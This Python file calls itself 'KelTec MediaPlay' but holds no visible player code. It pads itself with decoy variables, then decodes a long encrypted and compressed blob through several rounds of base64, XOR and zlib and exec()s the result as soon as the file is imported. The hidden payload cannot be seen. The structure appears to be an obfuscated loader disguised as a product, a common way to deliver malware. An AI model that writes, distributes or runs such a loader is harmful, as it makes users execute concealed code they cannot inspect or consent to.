# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 409545 ^ 451537
_lx1_1 = len("2ffa84")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-891854)
_lx3_3 = 405933 * 0
_lx4_4 = 322761 ^ 128930
_K = '32f4f1d02a77505a0445d476f994b3d6877e41c353ebeb84532746e550941c98'
_M = '6wHF6zhCgsfKPw=='
_D = 'XsNr7CiouF7GAWQEp9pJaE4VcKhEqVAWHjyj64TDM+HjuyIch6bb0qujNTWQW7+4C8kd0ffld2w3JB0RoaR6Qgafqa0pVwRPxTuyRG8tpBVr4hCGjjoKb66s0ui787bqfWxwtSlFv5XEcY2oU+i2wLyHR/iUjDr72YlQp+zeT6VMCK/k3OW2Ymj6s7aiNgZUkPFUwrWeYXhnnKMRwICBp2y13DRk9QfN7NZxr0zzqserrAXxURmWY7TX/GDRiVLSXyLHv/D6P6GGAbYsD3VRMHSTyiUS0oIml7YW+vVxKfzgm7TBFJtBtBHUin0uw2RnS/+A2MRzNCzAa8j15oFOzwVLskmh02ginP4zK3wgrpSp/LEJMuNfHK5Vm/Ysn4QKeq3qlXqLNOHOhf+t2R5GOMa3UxvSyO+uyALBm0yy3JAXwB9szaXUbRU8756NFPHURTvmKnaCqgBPpuWlawrwhSBTy4G8sB/rPtx6sa2t+kE/njdii84n3Z92No7lT8Hp4XCbOBP8YGS9ULIUU1m1N2M/Mgqf6qazjJ8IKDJiYjb/nxX4Stv0DqRgi6hxZ84GB8MSDqJuT9w3wFg+8d5Za4F6m+7eHP8gol3NroqAH/DvEOp0gt0gFu/RKKbl7CcEb6243y/iEsrbRvHUhIx6qLpOkEpkvT3AVUPmEf4UxtoaEfmb8J7ohneMVVa21lrkq0szX6FNR4ptszuJn/Paar4A0m7GI7s0F6pLMdfqFm/CMYQZ1df+gMj9BPZg4yGZJZqM5aPGXP2EW7A+wA+qcnXpzfend4lzaXk+vN0xllUNiXrBUfGa6VaT92FVP9EzKmgtsN587xmIbC+I5mPpduaMBQWqWgtmHYxwy6xGrXo6aU800z2qxNJTvAJN/suP01sxoXHUaPh303P/jlYGnlK77w51JPaDcStMb9mECInjsNy1LgJRR+LOOqbqUSrsiCRPvy1+lr5hQNpVjZu1NoGc+cpXzgsLDmXuGFQWMtGZkyweLrgaq46FxWDXUoJUfJlrpEGF3Kf6258RA+IOPS7Tsd9lH+VHhitersh6+MZyXQM9Y0BzlyXtNikYDsLnrz7FtwgzS7YrPwO0T6uwkCORx19OrUiVj9FtcaUxegWkZqZAk7W8DiVyj2hQb9sxjFxlpzOOXZgdbYMK+qjg6kh+6xjIvsvZrv+UFZP+aovrTwpndlRxz6jwTMHS0R/+jCeq3pyK4vIyvlymTnLqe2oIWd1eZPSW7H+53WyLb69wdz6R5d6gdBQY4Ve0UFyaGByBKkQk28H9GCP2/FhcgoP/2+YntD3LYH7+4GM5/aUkTl1NQAZE6ZiKdW4SXLy5iGvla50X1QOevdy+8MhrUYxBXyCEB8dVlZ4a7Z2mI//d5hvGRIGoSrBtTqIGNPnLxLlU14JDzCCP9soi1/KF5K8s61bZHAxHUjW9ID7BIoy3LqB3aQDtZKQqD/jVQPAPeC+EQ4p1O63Q7013QlslZbK0yN3nW0DmuS45bD8nk8Msb7j0ntdgGrU6r9qr8jtQPISH/W0YH5YNaqyq4+ti8ulD6Brmlyh2E/Bon82Mr28hYJVqtmDaxyfzCe+OeLyM2G+p0BDe/d7km8TaLr2U4zbmAyEJqZV7vMmo5ctJ7VqDkgPqAHK4Bo3b65v6l3EmaYSY+l8vlGNpgtmHiYRUxe3tLN+YJ+/Kju34mJdIiMwAueKh6Bsx1ZPgKfJ+0IruaH4raPFFK5AaYhe9CH8YWzTjlc1ZoAkwvtRvznL5fGQ6hiXEyhryb0huTWlhSW3O8CLfsks8nToSMoLvtXbq47eo8Ay8Ydxc8EN+OZCluvxC'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})
